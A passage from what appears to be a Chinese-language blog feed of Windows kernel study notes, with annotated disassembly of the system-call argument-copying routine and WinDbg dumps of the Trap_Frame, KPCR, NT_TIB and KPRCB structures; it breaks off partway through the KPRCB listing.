class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">.text:004354E6                         _KiSystemServiceAccessTeb@0 proc near   ; DATA XREF: KiPreprocessAccessViolation(x,x,x)+3D↓o</span><br><span class="line">.text:004354E6</span><br><span class="line">.text:004354E6                         ; FUNCTION CHUNK AT .text:0043579E SIZE 0000000A BYTES</span><br><span class="line">.text:004354E6</span><br><span class="line">.text:004354E6 0B B1 70 0F 00 00                       or      esi, [ecx+0F70h]</span><br><span class="line">.text:004354EC 74 0A                                   jz      short loc_4354F8</span><br><span class="line">.text:004354EE 52                                      push    edx</span><br><span class="line">.text:004354EF 50                                      push    eax</span><br><span class="line">.text:004354F0 FF 15 0C 5A 56 00                       call    ds:_KeGdiFlushUserBatch</span><br><span class="line">.text:004354F6 58                                      pop     eax</span><br><span class="line">.text:004354F7 5A                                      pop     edx</span><br><span class="line">.text:004354F8</span><br><span class="line">.text:004354F8                         loc_4354F8:                             ; CODE XREF: KiEndUnexpectedRange()+63C↑j</span><br><span class="line">.text:004354F8                                                                 ; KiSystemServiceAccessTeb()+6↑j</span><br><span class="line">.text:004354F8 64 FF 05 B0 06 00 00                    inc     large dword ptr fs:6B0h</span><br><span class="line">.text:004354FF 8B F2                                   mov     esi, edx</span><br><span class="line">.text:00435501 33 C9                                   xor     ecx, ecx</span><br><span class="line">.text:00435503 8B 57 0C                                mov     edx, [edi+0Ch]</span><br><span class="line">.text:00435506 8B 3F                                   mov     edi, [edi]</span><br><span class="line">.text:00435508 8A 0C 10                                mov     cl, [eax+edx]</span><br><span class="line">.text:0043550B 8B 14 87                                mov     edx, [edi+eax*4]</span><br><span class="line">.text:0043550E 2B E1                                   sub     esp, ecx</span><br><span class="line">.text:00435510 C1 E9 02                                shr     ecx, 2</span><br><span class="line">.text:00435513 8B FC                                   mov     edi, esp</span><br><span class="line">.text:00435515 F6 45 72 02                             test    byte ptr [ebp+72h], 2</span><br><span class="line">.text:00435519 75 06                                   jnz     short loc_435521</span><br><span class="line">.text:0043551B F6 45 6C 01                             test    byte ptr [ebp+6Ch], 1</span><br><span class="line">.text:0043551F 74 0C                                   jz      short _KiSystemServiceCopyArguments@0 ; KiSystemServiceCopyArguments()</span><br><span class="line">.text:00435521</span><br><span class="line">.text:00435521                         loc_435521:                             ; CODE XREF: KiSystemServiceAccessTeb()+33↑j</span><br><span class="line">.text:00435521 3B 35 34 58 56 00                       cmp     esi, ds:_MmUserProbeAddress</span><br><span class="line">.text:00435527 0F 83 71 02 00 00                       jnb     loc_43579E</span><br><span class="line">.text:00435527                         _KiSystemServiceAccessTeb@0 endp</span><br><span class="line">.text:00435527</span><br><span class="line">.text:0043552D</span><br><span class="line">.text:0043552D                         ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:0043552D</span><br><span class="line">.text:0043552D</span><br><span class="line">.text:0043552D                         ; int __usercall KiSystemServiceCopyArguments@&lt;eax&gt;(void (*)(void)@&lt;edx&gt;, int@&lt;ecx&gt;, unsigned int@&lt;ebx&gt;, int@&lt;ebp&gt;, void *@&lt;edi&gt;, const void *@&lt;esi&gt;)</span><br><span class="line">.text:0043552D                         _KiSystemServiceCopyArguments@0 proc near</span><br><span class="line">.text:0043552D                                                                 ; CODE XREF: KiSystemServiceAccessTeb()+39↑j</span><br><span class="line">.text:0043552D                                                                 ; DATA XREF: KiPreprocessAccessViolation(x,x,x):loc_4D84BC↓o</span><br><span class="line">.text:0043552D</span><br><span class="line">.text:0043552D                         ; FUNCTION CHUNK AT .text:00435964 SIZE 0000000C BYTES</span><br><span class="line">.text:0043552D</span><br><span class="line">.text:0043552D F3 A5                                   rep movsd</span><br><span class="line">.text:0043552F F6 45 6C 01                             test    byte ptr [ebp+6Ch], 1</span><br><span class="line">.text:00435533 74 16                                   jz      short loc_43554B</span><br><span class="line">.text:00435535 64 8B 0D 24 01 00 00                    mov     ecx, large fs:124h</span><br><span class="line">.text:0043553C 8B 3C 24                                mov     edi, [esp+0]</span><br><span class="line">.text:0043553F 89 99 3C 01 00 00                       mov     [ecx+13Ch], ebx</span><br><span class="line">.text:00435545 89 B9 2C 01 00 00                       mov     [ecx+12Ch], edi</span><br><span class="line">.text:0043554B</span><br><span class="line">.text:0043554B                         loc_43554B:                             ; CODE XREF: KiSystemServiceCopyArguments()+6↑j</span><br><span class="line">.text:0043554B 8B DA                                   mov     ebx, edx</span><br><span class="line">.text:0043554D F6 05 C8 2F 53 00 40                    test    byte ptr ds:dword_532FC8, 40h</span><br><span class="line">.text:00435554 0F 95 45 12                             setnz   byte ptr [ebp+12h]</span><br><span class="line">.text:00435558 0F 85 06 04 00 00                       jnz     loc_435964</span><br><span class="line">.text:0043555E</span><br><span class="line">.text:0043555E                         loc_43555E:                             ; CODE XREF: KiSystemServiceCopyArguments()+43E↓j</span><br><span class="line">.text:0043555E FF D3                                   call    ebx</span><br><span class="line">.text:0043555E                         _KiSystemServiceCopyArguments@0 endp</span><br></pre></td></tr></table></figure><p>然后已经知道了 <code>edi</code> 指向了正确的表 <code>mov edi,[edi]</code> 就让 <code>edi</code> 指向了函数表，<code>mov edx,[edi+eax*4]</code> 随后通过 <code>eax</code> 选择执行的函数，最后 <code>call</code>。</p><p>上面还有一个步骤是复制参数，因为中断门进来的参数还在 R3，并没有被带到 R0，复制参数是通过：</p><p><code>mov edx,[edi+0Ch]</code> 拿到参数个数表，再 <code>mov cl,[eax+edx]</code> 拿到具体参数字节数，然后 <code>shr ecx,2</code> 右移两位得到参数个数（假设所有参数都是四字节大小）。然后前面分别给 <code>edi</code> 和 <code>esi</code> 赋值，最后使用了 <code>rep movsd</code> 指令，这个指令会根据 <code>ecx</code> 的值为步长，每次从 <code>esi</code> 指向的地址搬运四个字节到 <code>edi</code> 指向的地址，所以搬运参数仅通过这一条指令就完成了。</p><p>至此我们分析完了系统调用的入口。</p><p>后续还需要分析函数调用完成之后退出系统调用的过程，由于这一部分知识需要学习 APC 之后才能看，所以今天就到这里，分析完一遍系统调用的过程收获还是挺大的。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="http://www.qfrost.com/posts/windowskernel/windows%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_3">http://www.qfrost.com/posts/windowskernel/windows系统调用学习笔记_3</a></li><li>[2]：<a href="https://www.cnblogs.com/wingsummer/p/15543945.html">https://www.cnblogs.com/wingsummer/p/15543945.html</a></li><li>[3]：<a href="https://www.cnblogs.com/wingsummer/p/15558928.html">https://www.cnblogs.com/wingsummer/p/15558928.html</a></li></ul>]]></content>
    
    
    <summary type="html">来深入挖掘一下Windows系统调用的过程</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="系统调用" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>windows系统调用学习——调用相关结构体学习</title>
    <link href="https://xia0ji233.github.io/2025/01/22/WindowsSyscall2/"/>
    <id>https://xia0ji233.github.io/2025/01/22/WindowsSyscall2/</id>
    <published>2025-01-22T02:00:00.000Z</published>
    <updated>2025-01-22T03:21:07.481Z</updated>
    
    <content type="html"><![CDATA[<p>来深入挖掘一下Windows系统调用的过程</p><span id="more"></span><h2 id="相关结构体介绍"><a href="#相关结构体介绍" class="headerlink" title="相关结构体介绍"></a>相关结构体介绍</h2><h3 id="Trap-Frame"><a href="#Trap-Frame" class="headerlink" title="Trap_Frame"></a>Trap_Frame</h3><p>首先第一个要讲的是 Trap_Frame 结构，如下图所示。</p><img src="/2025/01/22/WindowsSyscall2/1.png" class=""><p>栈帧结构体，用于 <code>Windows API</code> 保存现场。经过提权进入0环的时候，<code>Windows</code>就会遵守这个结构体保存一系列的数据，最后四个成员用于虚拟8086模式下，不属于保护模式的范畴。</p><p>中断发生时，若发生权限变换，则要保存旧堆栈，<code>CPU</code>压入的，由 <code>HardwareEsp</code> 和 <code>HardwareSegSs</code> 两个成员保存。</p><p>中断发生时，保存被中断的代码段和<code>iret</code>要返回的地址，<code>CPU</code>压入的，由 <code>Eip</code>，<code>SegCs</code> 和 <code>EFlags</code> 三个成员保存。</p><p><code>Windows</code> 中<strong>非易失性寄存器</strong>需要在中断例程中先保存，其中<strong>非易失性寄存器</strong>指的是在调用之前和调用之后仍然会保持原值的寄存器。通常来说，调用例程会选择要么不去写这些寄存器，如果一定要写寄存器，则会通过堆栈在调用之前保存该值，调用结束之后重新取回。</p><h3 id="KPCR"><a href="#KPCR" class="headerlink" title="KPCR"></a>KPCR</h3><p><code>kpcr</code>：<code>cpu</code> 核控制块，<code>cpu</code> 一个核一个 <code>kpcr</code> 结构，<code>fs=0x30</code> 在内核中的时候，指向的是 <code>kpcr</code> 结构，<code>fs=0x3b</code> 在应用层的时候，指向的是当前线程的 <code>TEB</code></p><p><code>KPCR</code> 里面还嵌套着两个结构体 <code>TIB</code> 和 <code>KPRCB</code>。</p><p>查看计算机有多少核：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd KeNumberProcessors L1</span><br><span class="line">83daaa2c  00000001</span><br></pre></td></tr></table></figure><p>查看 <code>KPCR</code> 结构体可以通过 <code>KiProcessorBlock</code> 数组得到。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd KiProcessorBlock</span><br><span class="line">83daa980  80b97120 00000000 00000000 00000000</span><br><span class="line">83daa990  00000000 00000000 00000000 00000000</span><br><span class="line">83daa9a0  00000000 00000000 00000000 00000000</span><br><span class="line">83daa9b0  00000000 00000000 00000000 00000000</span><br><span class="line">83daa9c0  00000000 00000000 00000000 00000000</span><br><span class="line">83daa9d0  00000000 00000000 00000000 00000000</span><br><span class="line">83daa9e0  00000000 00000000 00000000 00000000</span><br><span class="line">83daa9f0  00000000 00000000 00000000 00000000</span><br></pre></td></tr></table></figure><p>因为只有一个核，所以看到只存储了一个 <code>KPCR</code> 指针，用 <code>dt</code> 命令查看结构体值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt nt!_KPCR 80b97000</span><br><span class="line">   +0x000 NtTib            : _NT_TIB</span><br><span class="line">   +0x000 Used_ExceptionList : 0xa8d2706c _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +0x004 Used_StackBase   : (null) </span><br><span class="line">   +0x008 Spare2           : (null) </span><br><span class="line">   +0x00c TssCopy          : 0x80b93c00 Void</span><br><span class="line">   +0x010 ContextSwitches  : 0x35bf7</span><br><span class="line">   +0x014 SetMemberCopy    : 1</span><br><span class="line">   +0x018 Used_Self        : 0x7ffda000 Void</span><br><span class="line">   +0x01c SelfPcr          : 0x80b97000 _KPCR</span><br><span class="line">   +0x020 Prcb             : 0x80b97120 _KPRCB</span><br><span class="line">   +0x024 Irql             : 0x1f &#x27;&#x27;</span><br><span class="line">   +0x028 IRR              : 0</span><br><span class="line">   +0x02c IrrActive        : 0</span><br><span class="line">   +0x030 IDR              : 0xffffffff</span><br><span class="line">   +0x034 KdVersionBlock   : 0x83d6f5c0 Void</span><br><span class="line">   +0x038 IDT              : 0x80b93000 _KIDTENTRY</span><br><span class="line">   +0x03c GDT              : 0x80b93800 _KGDTENTRY</span><br><span class="line">   +0x040 TSS              : 0x80b93c00 _KTSS</span><br><span class="line">   +0x044 MajorVersion     : 1</span><br><span class="line">   +0x046 MinorVersion     : 1</span><br><span class="line">   +0x048 SetMember        : 1</span><br><span class="line">   +0x04c StallScaleFactor : 0x973</span><br><span class="line">   +0x050 SpareUnused      : 0 &#x27;&#x27;</span><br><span class="line">   +0x051 Number           : 0 &#x27;&#x27;</span><br><span class="line">   +0x052 Spare0           : 0 &#x27;&#x27;</span><br><span class="line">   +0x053 SecondLevelCacheAssociativity : 0 &#x27;&#x27;</span><br><span class="line">   +0x054 VdmAlert         : 0</span><br><span class="line">   +0x058 KernelReserved   : [14] 0</span><br><span class="line">   +0x090 SecondLevelCacheSize : 0</span><br><span class="line">   +0x094 HalReserved      : [16] 0x1000000</span><br><span class="line">   +0x0d4 InterruptMode    : 0</span><br><span class="line">   +0x0d8 Spare1           : 0 &#x27;&#x27;</span><br><span class="line">   +0x0dc KernelReserved2  : [17] 0</span><br><span class="line">   +0x120 PrcbData         : _KPRCB</span><br></pre></td></tr></table></figure><p>把里面存入的两个结构体 <code>_NT_TIB</code> 和 <code>_KPRCB</code> 介绍一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt nt!_NT_TIB 0xa8d2706c</span><br><span class="line">   +0x000 ExceptionList    : 0xa8d270d4 _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +0x004 StackBase        : 0x83cfe4a2 Void</span><br><span class="line">   +0x008 StackLimit       : 0x5396aa78 Void</span><br><span class="line">   +0x00c SubSystemTib     : (null) </span><br><span class="line">   +0x010 FiberData        : 0xa8d270e4 Void</span><br><span class="line">   +0x010 Version          : 0xa8d270e4</span><br><span class="line">   +0x014 ArbitraryUserPointer : 0x83cf9851 Void</span><br><span class="line">   +0x018 Self             : 0x00000004 _NT_TIB</span><br></pre></td></tr></table></figure><p>其中 <code>_KPRCB</code> 是直接包含而不是用指针引用的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt nt!_KPRCB 0x80b97120</span><br><span class="line">   +0x000 MinorVersion     : 1</span><br><span class="line">   +0x002 MajorVersion     : 1</span><br><span class="line">   +0x004 CurrentThread    : 0x88a20a60 _KTHREAD</span><br><span class="line">   +0x008 NextThread       : (null) </span><br><span class="line">   +0x00c IdleThread       : 0x83d764c0 _KTHREAD</span><br><span class="line">   +0x010 LegacyNumber     : 0 &#x27;&#x27;</span><br><span class="line">   +0x011 NestingLevel     : 0x1 &#x27;&#x27;</span><br><span class="line">   +0x012 BuildType        : 0</span><br><span class="line">   +0x014 CpuType          : 6 &#x27;&#x27;</span><br><span class="line">   +0x015 CpuID            : 1 &#x27;&#x27;</span><br><span class="line">   +0x016 CpuStep          : 0xb701</span><br><span class="line">   +0x016 CpuStepping      : 0x1 &#x27;&#x27;</span><br><span class="line">   +0x017 CpuModel         : 0xb7 &#x27;&#x27;</span><br><span class="line">   +0x018 ProcessorState   : _KPROCESSOR_STATE</span><br><span class="line">   +0x338 KernelReserved   : [16] 0</span><br><span class="line">   +0x378 HalReserved      : [16] 0x969600</span><br><span class="line">   +0x3b8 CFlushSize       : 0x40</span><br><span class="line">   +0x3bc CoresPerPhysicalProcessor : 0x1 &#x27;&#x27;</span><br><span class="line">   +0x3bd LogicalProcessorsPerCore : 0x1 &#x27;&#x27;</span><br><span class="line">   +0x3be PrcbPad0         : [2]  &quot;&quot;</span><br><span class="line">   +0x3c0 MHz              : 0x973</span><br><span class="line">   +0x3c4 CpuVendor        : 0x1 &#x27;&#x27;</span><br><span class="line">   +0x3c5 GroupIndex       : 0 &#x27;&#x27;</span><br><span class="line">   +0x3c6 Group            : 0</span><br><span class="line">   +0x3c8 GroupSetMember   : 1</span><br><span class="line">   +0x3cc Number           : 0</span><br><span class="line">   +0x3d0 PrcbPad1         : [72]  &quot;&quot;</span><br><span class="line">   +0x418 LockQueue        : [17] _KSPIN_LOCK_QUEUE</span><br><span class="line">   +0x4a0 NpxThread        : 0x88a20a60 _KTHREAD</span><br><span class="line">   +0x4a4 InterruptCount   : 0xaf7b</span><br><span class="line">   +0x4a8 KernelTime       : 0x16d2</span><br><span class="line">   +0x4ac UserTime         : 0x385</span><br><span class="line">   +0x4b0 DpcTime          : 0x1fe</span><br><span class="line">   +0x4b4 DpcTimeCount     : 0</span><br><span class="line">   +0x4b8 InterruptTime    : 0x58</span><br><span class="line">   +0x4bc AdjustDpcThreshold : 0x11</span><br><span class="line">   +0x4c0 PageColor        : 0x1356</span><br><span class="line">   +0x4c4 DebuggerSavedIRQL : 0x1c &#x27;&#x27;</span><br><span class="line">   +0x4c5 NodeColor        : 0 &#x27;&#x27;</span><br><span class="line">   +0x4c6 PrcbPad20        : [2]  &quot;&quot;</span><br><span class="line">   +0x4c8 NodeShiftedColor : 0</span><br><span class="line">   +0x4cc ParentNode       : 0x83d76440 _KNODE</span><br><span class="line">   +0x4d0 SecondaryColorMask : 0xff</span><br><span class="line">   +0x4d4 DpcTimeLimit     : 0</span><br><span class="line">   +0x4d8 MsrIa32TsxCtrl   : 0</span><br><span class="line">   +0x4e0 CcFastReadNoWait : 0</span><br><span class="line">   +0x4e4 CcFastReadWait   : 0x1514</span><br><span class="line">   +0x4e8 CcFastReadNotPossible : 0</span><br><span class="line">   +0x4ec CcCopyReadNoWait : 0</span><br><span class="line">   +0x4f0 CcCopyReadWait   : 0x176a</span><br><span class="line">   +0x4f4 CcCopyReadNoWaitMiss : 0</span><br><span class="line">   +0x4f8 MmSpinLockOrdering : 0n0</span><br><span class="line">   +0x4fc IoReadOperationCount : 0n7085</span><br><span class="line">   +0x500 IoWriteOperationCount : 0n1965</span><br><span class="line">   +0x504 IoOtherOperationCount : 0n82423</span><br><span class="line">   +0x508 IoReadTransferCount : _LARGE_INTEGER 0x30316f8</span><br><span class="line">   +0x510 IoWriteTransferCount : _LARGE_INTEGER 0xc7b2db</span><br><span class="line">   +0x518 IoOtherTransferCount : _LARGE_INTEGER 0x308a77</span><br><span class="line">   +0x520 CcFastMdlReadNoWait : 0</span><br><span class="line">   +0x524 CcFastMdlReadWait : 0</span><br><span class="line">   +0x528 CcFastMdlReadNotPossible : 0</span><br><span class="line">   +0x52c CcMapDataNoWait  : 0</span><br><span class="line">   +0x530 CcMapDataWait    : 0x995f</span><br><span class="line">   +0x534 CcPinMappedDataCount : 0x891</span><br><span class="line">   +0x538 CcPinReadNoWait  : 0</span><br><span class="line">   +0x53c CcPinReadWait    : 0x2b1</span><br><span class="line">   +0x540 CcMdlReadNoWait  : 0</span><br><span class="line">   +0x544 CcMdlReadWait    : 1</span><br><span class="line">   +0x548 CcLazyWriteHotSpots : 0xd</span><br><span class="line">   +0x54c CcLazyWriteIos   : 0x88</span><br><span class="line">   +0x550 CcLazyWritePages : 0x375</span><br><span class="line">   +0x554 CcDataFlushes    : 0x18e</span><br><span class="line">   +0x558 CcDataPages      : 0x4ff</span><br><span class="line">   +0x55c CcLostDelayedWrites : 0</span><br><span class="line">   +0x560 CcFastReadResourceMiss : 0</span><br><span class="line">   +0x564 CcCopyReadWaitMiss : 0x371</span><br><span class="line">   +0x568 CcFastMdlReadResourceMiss : 0</span><br><span class="line">   +0x56c CcMapDataNoWaitMiss : 0</span><br><span class="line">   +0x570 CcMapDataWaitMiss : 0x7f0</span><br><span class="line">   +0x574 CcPinReadNoWaitMiss : 0</span><br><span class="line">   +0x578 CcPinReadWaitMiss : 0x16</span><br><span class="line">   +0x57c CcMdlReadNoWaitMiss : 0</span><br><span class="line">   +0x580 CcMdlReadWaitMiss : 0</span><br><span class="line">   +0x584 CcReadAheadIos   : 0x772</span><br><span class="line">   +0x588 KeAlignmentFixupCount : 0</span><br><span class="line">   +0x58c KeExceptionDispatchCount : 0x1d1</span><br><span class="line">   +0x590 KeSystemCalls    : 0x75b693</span><br><span class="line">   +0x594 AvailableTime    : 0x331</span><br><span class="line">   +0x598 PrcbPad22        : [2] 0</span><br><span class="line">   +0x5a0 PPLookasideList  : [16] _PP_LOOKASIDE_LIST</span><br><span class="line">   +0x620 PPNPagedLookasideList : [32] _GENERAL_LOOKASIDE_POOL</span><br><span class="line">   +0xf20 PPPagedLookasideList : [32] _GENERAL_LOOKASIDE_POOL</span><br><span class="line">   +0x1820 PacketBarrier    : 0</span><br><span class="line">   +0x1824 ReverseStall     : 0n4</span><br><span class="line">   +0x1828 IpiFrame         : (null) </span><br><span class="line">   +0x182c PrcbPad3         : [52]  &quot;&quot;</span><br><span class="line">   +0x1860 CurrentPacket    : [3] (null) </span><br><span class="line">   +0x186c TargetSet        : 0</span><br><span class="line">   +0x1870 WorkerRoutine    : (null) </span><br><span class="line">   +0x1874 IpiFrozen        : 0</span><br><span class="line">   +0x1878 PrcbPad4         : [40]  &quot;&quot;</span><br><span class="line">   +0x18a0 RequestSummary   : 0</span><br><span class="line">   +0x18a4 SignalDone       : (null) </span><br><span class="line">   +0x18a8 TrappedSecurityDomain : 0x00000001`0000001d</span><br><span class="line">   +0x18b0 BpbState         : 0x2 &#x27;&#x27;</span><br><span class="line">   +0x18b0 BpbCpuIdle       : 0y0</span><br><span class="line">   +0x18b0 BpbFlushRsbOnTrap : 0y1</span><br><span class="line">   +0x18b0 BpbIbpbOnReturn  : 0y0</span><br><span class="line">   +0x18b0 BpbIbpbOnTrap    : 0y0</span><br><span class="line">   +0x18b0 BpbReserved      : 0y0000</span><br><span class="line">   +0x18b1 BpbFeatures      : 0x2 &#x27;&#x27;</span><br><span class="line">   +0x18b1 BpbClearOnIdle   : 0y0</span><br><span class="line">   +0x18b1 BpbEnabled       : 